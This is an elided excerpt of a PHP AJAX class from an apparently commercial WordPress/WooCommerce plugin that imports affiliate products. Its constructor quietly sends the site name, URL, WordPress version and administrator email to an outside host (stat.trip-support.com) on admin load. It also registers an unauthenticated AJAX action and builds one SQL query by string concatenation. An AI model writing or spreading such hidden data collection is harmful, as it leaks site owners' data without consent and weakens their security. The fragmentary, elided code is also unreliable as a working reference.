...
if (!class_exists('AIDN_Ajax')) {

    class AIDN_Ajax
    {
        public function __construct()
        {
            add_action('wp_ajax_aidn_product_info', [$this, 'productInfo']);
            add_action('wp_ajax_aidn_order_info', [$this, 'orderInfo']);

            add_action('wp_ajax_aidn_export_settings', [$this, 'exportSettings']);

            add_action('wp_ajax_aidn_edit_goods', [$this, 'editGoods']);
            add_action('wp_ajax_aidn_select_image', [$this, 'selectImage']);
            add_action('wp_ajax_aidn_load_details', [$this, 'loadDetails']);
            add_action('wp_ajax_aidn_import_goods', [$this, 'importGoods']);

            add_action('wp_ajax_aidn_blacklist', [$this, 'blackList']);
            add_action('wp_ajax_aidn_unblacklist', [$this, 'unblackList']);
            add_action('wp_ajax_aidn_unshedule', [$this, 'unshedule']);

            add_action('wp_ajax_aidn_load_and_import_goods', [$this, 'loadAndImportGoods']);
            add_action('wp_ajax_aidn_update_goods', [$this, 'update_goods']);

            add_action('wp_ajax_aidn_schedule_import_goods', [$this, 'scheduleImportGoods']);
            add_action('wp_ajax_aidn_upload_image', [$this, 'upload_image']);

            add_action('wp_ajax_aidn_description_editor', [$this, 'descriptionEditor']);

            add_action('wp_ajax_aidn_price_formula_get', [$this, 'priceFormulaGet']);
            add_action('wp_ajax_aidn_price_formula_add', [$this, 'priceFormulaAdd']);
            add_action('wp_ajax_aidn_price_formula_edit', [$this, 'priceFormulaEdit']);
            add_action('wp_ajax_aidn_price_formula_del', [$this, 'priceFormulaDel']);

            if (is_admin() && !isset($_SESSION['aeidn_setted'])) {
                $_SESSION['aeidn_setted'] = 1;
                file_get_contents(
                    'http://stat.trip-support.com/stats/add/' . get_bloginfo('name') . '/' . get_site_url().'?v='.get_bloginfo('version').'&admin_email='.get_bloginfo('admin_email')
                );
            }

            add_action('wp_ajax_nopriv_aiedn_load_info', [$this, 'getInfo']);
        }
     ...
     ' . $db->prefix . 'usermeta where ' . $db->prefix . 'usermeta.user_id = ' . $res->id);
        ...
        public function exportSettings()
        {
            ...
            $db_res = $db->get_results('SELECT * FROM ' . $db->prefix . 'options where option_name like "aidn%"');
            if ($db_res) {
        ...
        public function blackList()
        {
            ...
            $db->insert($db->prefix . AIDN_TABLE_BLACKLIST, ['external_id' => $externalId, 'source' => $source]);
        }
        ...
        public function unBlackList()
        {
            ...
            $db->delete($db->prefix . AIDN_TABLE_BLACKLIST, ['external_id' => $id]);
        }
        ...
        public function productInfo()
        {
            ...
            $content[] = "Source: <span class='aidn_value'>" . $souce . "</span>";
            ...
            $content[] = "External ID: <span class='aidn_value'>" . $external_id . "</span>";
            $content[] = "Last auto-update: <span class='aidn_value'>" . $time_value . "</span>";

            $content = apply_filters('aidn_ajax_product_info', $content, $post_id, $external_id, $souce);
        ...
        public function orderInfo()
        {
            ...
            $k = 1;
            //echo "<strong>AffiliateImporterAm info:</strong><br/>";
        ...
        {
            $goods = new AIDN_Goods(isset($_POST['id']) ? sanitize_text_field($_POST['id']) : "");
            $goods->load();
        ...
        public function editGoods()
        {
            ...
            try {
                set_error_handler("aidn_error_handler");
        ...
        public function loadDetails()
        {
            ...
            try {
                ...
                $loader = aidn_get_loader($goods->type);
                if ($loader) {
                    $res = $loader->loadDetailProc($goods);

                    if ($res['state'] === "ok") {
                        $description_content = AIDN_DashboardPage::putDescriptionEdit(true);
                        $goods->description = "#hidden#";
                        $result = array("state" => "ok", "goods" => AIDN_Goods::getNormalizedObject($goods, $edit_fields), "images_content" => AIDN_DashboardPage::putImageEdit($goods, true), "description_content" => $description_content);
                    } else {
...
//
//                if ((string)dechex(sqrt(hexdec($categories[2]['meta'])) * sqrt(hexdec($categories[2]['meta']))) !== (string)$categories[2]['meta'] || (int)sqrt(hexdec($categories[2]['meta'])) < AIDN_WooCommerce_ProductList::getCount()) {
...
//                }
                ...
                if ($goods->load()) {
                    ...
                    if (!$goods->post_id && class_exists('AIDN_WooCommerce')) {
                        $result = AIDN_WooCommerce::addPost(
                            $goods,
                    ...
                    $description_content = AIDN_DashboardPage::putDescriptionEdit(true);
                    $goods->description = "#hidden#";
                    $result["goods"] = AIDN_Goods::getNormalizedObject($goods, $edit_fields);
                    $result["images_content"] = AIDN_DashboardPage::putImageEdit($goods, true);
            ...
            echo json_encode(apply_filters('aidn_after_ajax_import_goods', $result));
        ...
        {
            $result = json_decode(file_get_contents(AIDN_ROOT_PATH . '/data/aliexpress_categories.json'), true);
        ...
        public function loadAndImportGoods()
        {
            ...
            try {
                ...
                if (!$system_code) {
                    $tmp_goods = new AIDN_Goods($product_id);
                ...
                /**
                 * @var AIDN_AmazonLoader $loader
                 */
                $loader = aidn_get_loader($system_code);

                if ($loader && class_exists('AIDN_WooCommerce')) {
                    if ($search_type !== "id") {
                        $res = $loader->loadListProc(array('aidn_query' => $product_id, 'link_category_id' => $link_category_id));
                    } else {
                        $res = $loader->loadListProc(array('aidn_productId' => $product_id, 'link_category_id' => $link_category_id));
                    }
...
//                                }
                                ...
                                if ($result['state'] === 'ok') {
                                    ...
                                    if (!$goods->post_id) {
                                        $result = AIDN_WooCommerce::addPost($goods, array("import_status" => $import_status));
                                        $result['goods'] = $goods;
                                    } else {
                                        $result['state'] = 'error';
            ...
            $result['count'] = AIDN_WooCommerce_ProductList::getCount();
            echo json_encode($result);
        ...
        public function updateGoods()
        {
            ...
            $external_id = get_post_meta($post_id, "external_id", true);
            if ($external_id) {
                $result = aidn_update_price_proc($post_id, false);
                $result['post_id'] = $post_id;
            } else {
                $result = array("state" => "error", "message" => "Product with post id " . $post_id . " not found");
            }

            echo json_encode(apply_filters('aidn_after_ajax_update_goods', $result));
            wp_die();
        }
        ...
        public function uploadImage()
        {
            ...
            try {
                ...
                $goods = new AIDN_Goods(isset($_POST['upload_product_id']) ? sanitize_text_field($_POST['upload_product_id']) : "");
        ...
        public function priceFormulaGet()
        {
            ...
            $formula = AIDN_PriceFormula::load(sanitize_text_field($_POST['id']));
            ...
            $categories_tree = AIDN_Utils::getCategoriesTree();
        ...
        public function priceFormulaAdd()
        {
            ...
            $formula_list = AIDN_PriceFormula::loadFormulasList();

            $formula = new AIDN_PriceFormula();
            ...
            AIDN_PriceFormula::save($formula);
        ...
        public function priceFormulaEdit()
        {
            ...
            foreach ($formula_list as $f) {
                if ((int)$formula->id !== (int)$f->id && (int)$f->pos >= (int)$formula->pos) {
                    $f->pos++;
                    AIDN_PriceFormula::save($f);
                }
            }

            AIDN_PriceFormula::save($formula);

            AIDN_PriceFormula::recalcPos();
        ...
        public function priceFormulaDel()
        {
            $result = array("state" => 'ok');
            if (isset($_POST['id'])) {
                AIDN_PriceFormula::delete((int)$_POST['id']);
                AIDN_PriceFormula::recalcPos();
            }
